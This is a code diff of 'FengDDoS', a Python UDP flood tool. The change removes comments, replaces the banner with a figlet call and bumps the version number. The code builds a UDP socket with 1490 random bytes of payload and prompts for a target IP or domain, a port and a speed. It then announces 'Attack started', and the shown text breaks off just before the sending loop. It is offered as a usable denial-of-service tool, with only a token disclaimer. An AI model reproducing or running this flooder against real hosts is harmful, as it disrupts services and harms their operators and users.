@@ -7,7 +7,6 @@ import random
 from datetime import datetime
 from socket import gethostbyname 
 
-# ================= 颜色与样式定义 =================
 class color:
     RESET = "\033[0m"
     BOLD = "\033[1m"
@@ -17,35 +16,22 @@ class color:
     BLUE = "\033[94m"
     CYAN = "\033[96m"
 
-# ================= 全局变量与初始化 =================
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes_data = random._urandom(1490)
 
-# ================= 界面与交互函数 =================
 def show_banner():
-    """显示美观的启动界面"""
     os.system("clear")
-    # 修正了 G 的拼写，现在是正确的 FengDDoS
-    banner = f"""{color.CYAN}{color.BOLD}
-   ███████╗███████╗███╗   ██╗███████╗██╗    ██╗
-   ██╔════╝██╔════╝████╗  ██║██╔════╝██║    ██║
-   █████╗  █████╗  ██╔██╗ ██║█████╗  ██║ █╗ ██║
-   ██╔══╝  ██╔══╝  ██║╚██╗██║██╔══╝  ██║███╗██║
-   ██║     ██║     ██║ ╚████║███████╗╚███╔███╔╝
-   ╚═╝     ╚═╝     ╚═╝  ╚═══╝╚══════╝ ╚══╝╚══╝ 
-{color.RESET}"""
-    print(banner)
+    os.system("figlet FengDDoS")
     print(f"{color.YELLOW}---------------------------------------------------{color.RESET}")
     print(f"{color.BOLD} Author :{color.RESET} FengPwner")
     print(f"{color.BOLD} Github :{color.RESET} https://github.com/FengPwner")
     print(f"{color.BOLD} Atomgit:{color.RESET} https://atomgit.com/FengPwner")
     print(f"{color.BOLD} CSDN   :{color.RESET} https://blog.csdn.net/2302_76189356")
-    print(f"{color.BOLD} Version:{color.RESET} 1.0.1 (Typo Fixed)")
+    print(f"{color.BOLD} Version:{color.RESET} 1.0.2 (Cleaned)")
     print(f"{color.YELLOW}---------------------------------------------------{color.RESET}")
     print(f"{color.RED}{color.BOLD} [!] Do not use for illegal purposes!{color.RESET}\n")
 
 def handle_error(allow_edit=True):
-    """统一的错误交互处理"""
     while True:
         if allow_edit:
             choice = input(f"{color.YELLOW}[?] Return to menu (y), Exit (n), or Edit (e): {color.RESET}").strip().lower()
@@ -63,11 +49,9 @@ def handle_error(allow_edit=True):
                 sys.exit(0)
             else: print(f"{color.RED}[-] Invalid input. Please enter 'y' or 'n'.{color.RESET}")
 
-# ================= 主程序逻辑 =================
 while True:
     show_banner()
 
-    # --- 1. 目标 IP/域名 解析 ---
     while True:
         target = input(f"{color.BLUE}[1/3] IP or Domain (type 'exit' to quit): {color.RESET}")
         if target.strip().lower() == 'exit':
@@ -85,7 +69,6 @@ while True:
 
     if 'ip' not in locals() or target.strip().lower() == 'exit': continue 
 
-    # --- 2. 端口输入与校验 ---
     while True:
         port_input = input(f"{color.BLUE}[2/3] Port (1-65535, type 'exit' to quit): {color.RESET}")
         if port_input.strip().lower() == 'exit':
@@ -103,7 +86,6 @@ while True:
 
     if 'port' not in locals(): continue 
 
-    # --- 3. 速度输入与校验 ---
     while True:
         sd_input = input(f"{color.BLUE}[3/3] Speed (1~1000, type 'exit' to quit): {color.RESET}")
         if sd_input.strip().lower() == 'exit':
@@ -121,7 +103,6 @@ while True:
 
     if 'sd' not in locals(): continue 
 
-    # --- 4. 开始发包 ---
     os.system("clear")
     print(f"{color.CYAN}{color.BOLD}[*] Attack started... Press Ctrl+C to stop.{color.RESET}\n")
     sent = 0
